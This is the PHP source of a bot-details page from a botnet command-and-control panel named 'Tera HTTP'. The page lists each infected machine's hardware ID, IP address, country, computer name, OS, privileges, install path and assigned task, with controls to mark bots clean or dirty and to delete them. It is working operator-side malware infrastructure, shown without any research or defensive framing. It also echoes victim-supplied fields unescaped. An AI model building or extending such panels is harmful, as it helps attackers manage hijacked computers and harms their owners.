<?php
include("../inc/botstats.php");
include '../inc/geo/geoip.inc';
$gi = geoip_open("../inc/geo/GeoIP.dat", "");
ini_set('display_errors', 'Off');
?>
<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="description" content="">
  <meta name="author" content="">

  <title>Tera HTTP</title>

  <!-- Bootstrap Core CSS -->
  <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- MetisMenu CSS -->
  <link href="../vendor/metisMenu/metisMenu.min.css" rel="stylesheet">

  <!-- Custom CSS -->
  <link href="../dist/css/sb-admin-2.css" rel="stylesheet">

  <!-- Morris Charts CSS -->
  <link href="../vendor/morrisjs/morris.css" rel="stylesheet">

  <!-- Custom Fonts -->
  <link href="../vendor/font-awesome/css/font-awesome.min.css" rel="stylesheet" type="text/css">

  <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
  <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
  <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

</head>

<body>

  <div id="wrapper">

    <!-- Navigation -->
    <nav class="navbar navbar-default navbar-static-top" role="navigation" style="margin-bottom: 0">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                    <span class="sr-only">Toggle navigation</span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                    <span class="icon-bar"></span>
                </button>
        <a class="navbar-brand" href="index.html">Tera HTTP</a>
      </div>
      <!-- /.navbar-header -->

      <ul class="nav navbar-top-links navbar-right">

        <!-- /.dropdown -->
        <li class="dropdown">
          <a class="dropdown-toggle" data-toggle="dropdown" href="#">
                        <i class="fa fa-user fa-fw"></i> <i class="fa fa-caret-down"></i>
                    </a>
         <ul class="dropdown-menu dropdown-user">
            <li><a href="settings.php"><i class="fa fa-gear fa-fw"></i> Settings</a>
            </li>
            <li class="divider"></li>
            <li><a href="logout.php"><i class="fa fa-sign-out fa-fw"></i> Logout</a>
            </li>
          </ul>
          <!-- /.dropdown-user -->
        </li>
        <!-- /.dropdown -->
      </ul>
      <!-- /.navbar-top-links -->

      <div class="navbar-default sidebar" role="navigation">
        <div class="sidebar-nav navbar-collapse">
          <ul class="nav" id="side-menu">
            <li class="sidebar-search">
              <div class="input-group custom-search-form">
                <input type="text" class="form-control" placeholder="Search...">
                <span class="input-group-btn">
                                <button class="btn btn-default" type="button">
                                    <i class="fa fa-search"></i>
                                </button>
                            </span>
              </div>
              <!-- /input-group -->
            </li>
            <li>
              <a href="index.php"><i class="fa fa-dashboard fa-fw"></i> Dashboard</a>
            </li>

            </li>
            <li>
              <a href="bots.php"><i class="fa fa-table fa-fw"></i> Bots</a>
            </li>
            <li>
              <a href="statistics.php"><i class="fa fa-th-list"></i> Statistics</a>
            </li>
            <li>
              <a href="tasks.php"><i class="fa fa-edit fa-fw"></i> Tasks </a>
            </li>
             <li>
              <a href="settings.php"><i class="fa fa-gears"></i> Settings </a>
            </li>



            <!-- /.nav-second-level -->
            </li>

          </ul>
        </div>
        <!-- /.sidebar-collapse -->
      </div>
      <!-- /.navbar-static-side -->
    </nav>
  <div id="page-wrapper">
      <div class="row">
<div class="col-lg-12 col-xs-24">
						<?php
						if (isset($_GET['id']))
						{
							if (!ctype_digit($_GET['id']))
							{
								echo '<div class="alert alert-danger">Specified ID is not valid. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}else{
								$cnt = $odb->prepare("SELECT COUNT(*) FROM bots WHERE id = :id");
								$cnt->execute(array(":id" => $_GET['id']));
								if (!($cnt->fetchColumn(0) > 0))
								{
									echo '<div class="alert alert-danger">Specified ID was not found in database. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
									die();
								}
							}
							if (isset($_GET['del']) && $_GET['del'] == "1")
							{
								$del = $odb->prepare("DELETE FROM bots WHERE id = :id LIMIT 1");
								$del->execute(array(":id" => $_GET['id']));
								$in = $odb->prepare("INSERT INTO plogs VALUES(NULL, :u, :ip, :r, UNIX_TIMESTAMP())");
								$in->execute(array(":u" => $username, ":ip" => $_SERVER['REMOTE_ADDR'], ":r" => 'Deleted bot #'.$_GET['id']));
								echo '<div class="alert alert-success">Bot deleted successfully. Redirecting...</div><meta http-equiv="refresh" content="2;url=?p=bots">';
								die();
							}
							if (isset($_GET['mark']))
							{
								$m = $_GET['mark'];
								if ($m == "1")
								{
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "1", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.</div>';
								}elseif ($m == "2"){
									$mark = $odb->prepare("UPDATE bots SET mark = :mark WHERE id = :id LIMIT 1");
									$mark->execute(array(":mark" => "2", ":id" => $_GET['id']));
									echo '<div class="alert alert-success">Bot marked successfully.</div>';
								}
							}
						}
						?>
					</div>
					<div class="col-lg-3 col-xs-6"></div>
					<div class="col-lg-6 col-xs-12">
						<center><a href="bots.php"><i class="fa fa-arrow-left"></i> Go back</a></center><br>
						<table class="table table-condensed table-hover table-striped table-bordered">
							<thead>
								<tr>
									<th width="50%">Key</th>
									<th width="50%">Value</th>
								</tr>
							</thead>
							<?php
							$details = $odb->prepare("SELECT * FROM bots WHERE id = :id");
							$details->execute(array(":id" => $_GET['id']));
							$d = $details->fetch(PDO::FETCH_ASSOC);
							?>
							<tbody>
								<tr><td>ID</td><td><?php echo $d['id']; ?></td></tr>
								<tr><td>HWID</td><td><?php echo $d['bothwid']; ?></td></tr>
								<tr><td>IP Address</td><td><?php echo $d['ipaddress']; ?></td></tr>
								<tr><td>Country</td><td><?php echo geoip_country_name_by_id($gi, $d['country']); echo '&nbsp;&nbsp;<img src="img/flags/'.strtolower(geoip_country_code_by_id($gi, $d['country'])).'.png" />'; ?></td></tr>
								<tr><td>Install Date</td><td><?php echo date("m-d-Y, h:i A", $d['installdate']); ?></td></tr>
								<tr><td>Last Response</td><td><?php echo date("m-d-Y, h:i A", $d['lastresponse']); ?></td></tr>
								<tr><td>Current Task</td><td>#<?php echo $d['currenttask']; ?></td></tr>
								<tr><td>Computer Name</td><td><?php echo base64_decode($d['computername']); ?></td></tr>
								<tr><td>Operating System</td><td><?php echo $d['operatingsys']; ?></td></tr>
								<tr><td>Privileges</td><td><?php echo $d['privileges']; ?></td></tr>
								<tr><td>Installation Path</td><td><?php echo base64_decode($d['installationpath']); ?></td></tr>
								<tr><td>Last Reboot</td><td><?php echo base64_decode($d['lastreboot']); ?></td></tr>
								<tr><td>Bot Version</td><td><?php echo $d['botversion']; ?></td></tr>
							</tbody>
						</table>
						<center>
						<?php
						if ($d['mark'] == "1")
						{
							echo '<h4>This bot is marked as <font style="color: green;">Clean</font></h4><br><a class="btn btn-danger" href="?p=details&id='.$_GET['id'].'&mark=2">Mark bot as dirty</a>';
						}else{
							echo '<h4>This bot is marked as <font style="color: red;">Dirty</font></h4><br><a class="btn btn-success" href="?p=details&id='.$_GET['id'].'&mark=1">Mark bot as clean</a>';
						}
						?>
						<a href="?p=details&id=<?php echo $_GET['id']; ?>&del=1" class="btn btn-danger">Delete Bot</a>
						</center>
					</div>
				</div>
			</section>
		</aside>
	</div>

       
        <!-- /.panel -->

        <!-- /.panel .chat-panel -->
      
      <!-- /.col-lg-4 -->
</div>
</div>
    <!-- /.row -->
  </div>
  <!-- /#page-wrapper -->

  </div>
  <!-- /#wrapper -->

  <!-- jQuery -->
  <script src="../vendor/jquery/jquery.min.js"></script>

  <!-- Bootstrap Core JavaScript -->
  <script src="../vendor/bootstrap/js/bootstrap.min.js"></script>

  <!-- Metis Menu Plugin JavaScript -->
  <script src="../vendor/metisMenu/metisMenu.min.js"></script>

  <!-- Morris Charts JavaScript -->
  <script src="../vendor/raphael/raphael.min.js"></script>
  <script src="../vendor/morrisjs/morris.min.js"></script>
  <script src="../data/morris-data.js"></script>

  <!-- Custom Theme JavaScript -->
  <script src="../dist/js/sb-admin-2.js"></script>

</body>

</html>